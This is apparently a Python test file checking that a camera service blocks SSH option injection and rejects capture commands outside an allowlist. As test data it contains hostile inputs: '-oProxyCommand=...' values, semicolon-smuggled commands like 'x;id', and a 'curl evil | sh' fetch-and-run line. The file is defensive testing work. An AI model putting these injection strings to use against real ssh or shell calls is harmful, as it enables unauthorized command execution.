"""
SSH option injection guards for the camera service (2026-10-22).

ssh_user / ssh_host / capture_command come from the camera-endpoint API. A
value starting with '-' (e.g. ssh_user='-oProxyCommand=...') would be read by
ssh/scp as an option, so every ssh/scp call validates first and puts '--'
before the destination.
"""

import os
import sys
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

import backend.camera_service as cs  # noqa: E402

GOOD = dict(ssh_host='10.0.0.228', ssh_user='braindeadpi', ssh_port=22)


@pytest.mark.parametrize('user', ['-oProxyCommand=touch /tmp/pwned', '-v', '', 'a b', 'x;id', 'pi@evil', 'x' * 65])
def test_bad_users_rejected(user):
    assert cs.validate_ssh_target('10.0.0.228', user, 22) == 'Invalid SSH user'


@pytest.mark.parametrize('host', ['-oProxyCommand=id', '', 'a b', 'h;id', 'user@host', '.leadingdot', 'h/x'])
def test_bad_hosts_rejected(host):
    assert cs.validate_ssh_target(host, 'pi', 22) == 'Invalid SSH host'


@pytest.mark.parametrize('port', [0, 70000, 'x', None, -1])
def test_bad_ports_rejected(port):
    assert cs.validate_ssh_target('10.0.0.228', 'pi', port) == 'Invalid SSH port'


@pytest.mark.parametrize('host,user', [('10.0.0.228', 'braindeadpi'), ('gardenpi.local', 'pi'), ('pi-4', 'pi_user.x')])
def test_real_targets_accepted(host, user):
    assert cs.validate_ssh_target(host, user, 22) is None


def test_capture_command_allowlist(monkeypatch):
    monkeypatch.delenv('CAMERA_CAPTURE_COMMANDS', raising=False)
    for cmd in cs.DEFAULT_CAPTURE_COMMANDS:
        assert cs.validate_capture_command(cmd) is None
    assert cs.validate_capture_command('curl evil | sh') is not None
    monkeypatch.setenv('CAMERA_CAPTURE_COMMANDS', 'libcamera-still -o x.jpg || other')
    assert cs.validate_capture_command('libcamera-still -o x.jpg') is None
    assert cs.validate_capture_command('other') is None


def test_injection_never_reaches_subprocess():
    with patch.object(cs.subprocess, 'run') as run:
        r1 = cs.test_connection('10.0.0.228', '-oProxyCommand=id', 22)
        r2 = cs.reinitialize_camera('10.0.0.228', '-oProxyCommand=id', 22)
        r3 = cs.capture_image('10.0.0.228', '-oProxyCommand=id', 22, capture_command=cs.DEFAULT_CAPTURE_COMMANDS[0])
        r4 = cs.capture_image(capture_command='curl evil | sh', **GOOD)
    run.assert_not_called()
    assert r1['reachable'] is False and r2['success'] is False and r3['success'] is False and r4['success'] is False


def test_valid_call_puts_double_dash_before_destination():
    ok = MagicMock(returncode=0, stdout=b'OK', stderr=b'')
    with patch.object(cs.subprocess, 'run', return_value=ok) as run:
        cs.test_connection(**GOOD)
    for call in run.call_args_list:
        argv = call.args[0]
        dest = next(i for i, a in enumerate(argv) if isinstance(a, str) and a.startswith('braindeadpi@'))
        assert argv[dest - 1] == '--', argv
